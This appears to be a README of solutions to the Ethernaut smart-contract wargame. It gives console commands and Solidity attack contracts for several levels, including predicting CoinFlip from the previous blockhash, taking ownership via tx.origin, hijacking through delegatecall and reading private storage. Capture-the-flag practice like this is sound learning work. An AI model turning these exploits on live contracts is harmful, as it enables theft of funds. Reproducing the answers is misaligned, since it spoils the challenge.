# ethernaut-challenges

### challenge 1
await contract.contribute({value: toWei("0.000001")})

await contract.sendTransaction({value: toWei("0.000001")})

await contract.withdraw()

### challenge 2
Constructor spelled incorrectly


await contract.Fal1out({value: toWei("0.00000001")})

### challenge 3

```
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool) external;
}

contract Attack {
    address cF = 0x30C7A39F911f075F45434357af31Ec5aaA9828bb;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 public value;

    function attack() public returns (uint256){
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(cF).flip(side);

        return blockValue;
    }
}
```

### challenge 4

```
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address) external;
}

contract Attack {
    address telephoneAddress = 0x0bDb4C476e8719Db25Baac7Ab796008023C5Ed3A;
    address myAddress = 0xD0eba5f813cEfa1FD5f60E11feCD84f39a9dDA88;

    function attack() public {
        Telephone(telephoneAddress).changeOwner(myAddress);
    }
}
```

### challenge 5

Underflow and has to be called by someone else

### challenge 6

await window.web3.eth.sendTransaction({
    from: '0xD0eba5f813cEfa1FD5f60E11feCD84f39a9dDA88',
    to: '0x601D70A2fFAC4C90A3D4c4931564EE3d857d39F8',
    data: '0xdd365b8b'
})


### challenge 8

This will give you the pass:

await window.web3.eth.getStorageAt(contract.address,1)
